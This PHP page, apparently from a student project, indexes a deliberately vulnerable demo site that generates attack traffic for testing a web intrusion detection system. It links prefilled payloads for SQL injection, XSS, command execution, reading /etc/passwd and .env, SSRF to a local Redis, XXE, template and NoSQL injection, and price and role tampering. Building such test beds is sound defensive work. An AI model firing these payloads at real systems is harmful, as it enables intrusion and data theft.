<?php

declare(strict_types=1);

require_once __DIR__ . "/bootstrap.php";

$adminUrl = demo_base_url() . "/admin.php";

$cards = [
    [
        "title" => "SQL 注入",
        "desc" => "支持联合查询、布尔注入、时间盲注等参数演示。",
        "links" => [
            "打开页面" => "sqli.php",
            "联合查询" => "sqli.php?id=1+UNION+SELECT+null%2Cuser%28%29%2Cdatabase%28%29+--",
            "时间盲注" => "sqli.php?id=1%27%3Bwaitfor+delay+%270%3A0%3A5%27--",
        ],
    ],
    [
        "title" => "XSS",
        "desc" => "支持 script、事件属性、javascript 协议等演示。",
        "links" => [
            "打开页面" => "xss.php",
            "script 注入" => "xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "事件型 XSS" => "xss.php?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
        ],
    ],
    [
        "title" => "命令执行 / RCE",
        "desc" => "支持 cmd 参数执行系统命令。",
        "links" => [
            "Shell 页面" => "shell.php",
            "执行 whoami" => "shell.php?cmd=whoami",
            "执行 uname -a" => "shell.php?cmd=uname+-a",
        ],
    ],
    [
        "title" => "文件上传 / WebShell",
        "desc" => "上传危险脚本文件名，并支持访问上传目录。",
        "links" => [
            "打开上传页" => "upload.php",
            "访问上传目录" => "uploads/",
        ],
    ],
    [
        "title" => "路径穿越 / 敏感文件读取",
        "desc" => "支持 ../、php://filter、file:// 等读取方式。",
        "links" => [
            "打开 LFI 页面" => "lfi.php",
            "读取 /etc/passwd" => "lfi.php?file=../../../../etc/passwd",
            "读取 .env" => ".env",
        ],
    ],
    [
        "title" => "SSRF",
        "desc" => "支持本机、元数据地址、dict/file 协议访问。",
        "links" => [
            "打开代理页" => "proxy.php",
            "访问 admin.php" => demo_query_link("proxy.php", ["url" => $adminUrl]),
            "dict 协议" => "proxy.php?url=dict://127.0.0.1:6379/dbsize",
        ],
    ],
    [
        "title" => "XXE",
        "desc" => "支持危险 DTD 和外部实体解析。",
        "links" => [
            "打开 XXE 页面" => "xxe.php",
            "直接注入 DOCTYPE" => "xxe.php?xml=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C/foo%3E",
        ],
    ],
    [
        "title" => "SSTI / 模板注入",
        "desc" => '支持 {{7*7}} 和 ${7*7} 这类模板表达式。',
        "links" => [
            "打开模板页" => "ssti.php",
            "Jinja 风格" => "ssti.php?template=%7B%7B7*7%7D%7D",
            "EL 风格" => "ssti.php?template=%24%7B7*7%7D",
        ],
    ],
    [
        "title" => "NoSQL 注入",
        "desc" => '支持 $where、$ne、$regex 等 Mongo 风格测试。',
        "links" => [
            "打开页面" => "nosqli.php",
            '$where 注入' => "nosqli.php?filter=%7B%22%24where%22%3A%22this.password.length%3E0%22%7D",
            '$ne 绕过' => "nosqli.php?username=%7B%22%24ne%22%3Anull%7D&password=%7B%22%24ne%22%3Anull%7D",
        ],
    ],
    [
        "title" => "开放重定向 / 认证测试",
        "desc" => "支持 next 跳转和 POST 登录爆破演示。",
        "links" => [
            "打开 redirect" => "redirect.php",
            "外链跳转" => "redirect.php?next=http://example.com",
            "打开 login" => "login.php",
            "后台入口" => "admin.php",
        ],
    ],
    [
        "title" => "参数篡改 / 业务参数攻击",
        "desc" => "支持 role、is_admin、price、amount、discount、balance 等关键字段篡改。",
        "links" => [
            "打开参数页" => "tamper.php",
            "价格篡改" => "tamper.php?uid=1001&price=0.01&amount=0.01&quantity=99",
            "权限提权" => "tamper.php?uid=1001&role=admin&is_admin=1&status=vip",
        ],
    ],
    [
        "title" => "批量探测 / 攻击链演练",
        "desc" => "一键连续触发敏感路径、扫描探测、暴力破解与复合攻击链。",
        "links" => [
            "打开批量生成器" => "runner.php",
            "访问 /phpmyadmin" => "phpmyadmin",
            "访问 /.env" => ".env",
            "访问 /swagger" => "swagger",
        ],
    ],
];

ob_start();
?>
<section class="panel">
  <h2>站点说明</h2>
  <p>这是毕业设计中的 PHP 漏洞演示站，用来主动生成可被当前 Web IDS 规则识别的攻击流量。页面仅用于本地实验，请勿部署到公网环境。</p>
  <div class="notice">当前重点覆盖：SQLi、XSS、RCE、文件上传、LFI、SSRF、XXE、SSTI、NoSQL、参数篡改、敏感路径、认证爆破、开放重定向，并补充一键批量流量生成入口。</div>
</section>

<section class="grid">
  <?php foreach ($cards as $card): ?>
    <article class="panel">
      <h2><?= demo_h($card["title"]) ?></h2>
      <p><?= demo_h($card["desc"]) ?></p>
      <?= demo_examples($card["links"]) ?>
    </article>
  <?php endforeach; ?>
</section>
<?php
$content = ob_get_clean();
demo_render_page("IDS 漏洞测试网站", "用于和当前 Web IDS 规则一一对应的 PHP 攻击样本生成环境。", $content);
